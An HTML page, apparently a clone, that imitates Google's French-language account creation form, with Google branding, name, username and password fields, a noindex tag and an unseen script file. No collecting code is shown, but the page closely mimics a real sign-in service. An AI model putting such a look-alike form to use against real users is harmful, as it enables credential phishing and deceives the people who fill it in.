<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8">
  <title>Crée un compte</title>
  <link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
  <link href='https://fonts.googleapis.com/css?family=Material Icons' rel='stylesheet'>
  <link href="https://fonts.googleapis.com/css2?family=Jost:wght@300&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="stylecreate.css">
  <meta name="googlebot" content="noindex, nofollow">
  <link rel="shortcut icon" href="//www.google.com/favicon.ico">
</head>
  
<body>
  <div class="main">
  <form class="" action="">
    <div class="head">
      <img src="image/googlelogo.png" alt="" class="logo">
      <h3>Créer votre compte Google</h3>
    </div>
    <div class="name">
      <input type="name" required>
      <label>Prénom</label>
    </div>
    <div class="name">
      <input type="name" required>
      <label>Nom de famille</label>
    </div>
    <div class="user-name">
      <input type="username" required>
      <label>Nom d'utilisateur</label>
      <span class="gmail">@gmail.com</span>
    </div>
    <a class="line1">Vous pouvez utiliser des lettres, des chiffres et des points</a>
    <a href="" class="line2">Utiliser plutôt mon adresse e-mail actuelle</a>
    <div class="pass">
      <input type="password" class="password" id="pass1" required>
      <label>Mot de passe</label>
    </div>
    <div class="pass">
      <input type="password" class="password" id="pass2" required>
      <label>Confirmer</label>
      </div>
      <div class="iconeye">
    <img src="image/eyehide.png" onclick="show();" id="eye">
    </div>
    <a class="line3">Utilisez 8 caractères ou plus avec un mélange de lettres, de chiffres et de symboles</a>
    <a href="index.php" class="line4">Connectez-vous plutôt</a>
    <input onclick="go()" type="submit" value="Suivant">
  </form>
  <div class="side-image">
    <img src="image/sideimage.png" alt="" class="side-logo">
  </div>
  </div>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script><script  src="./scriptcreate.js"></script>
</body>
</html>
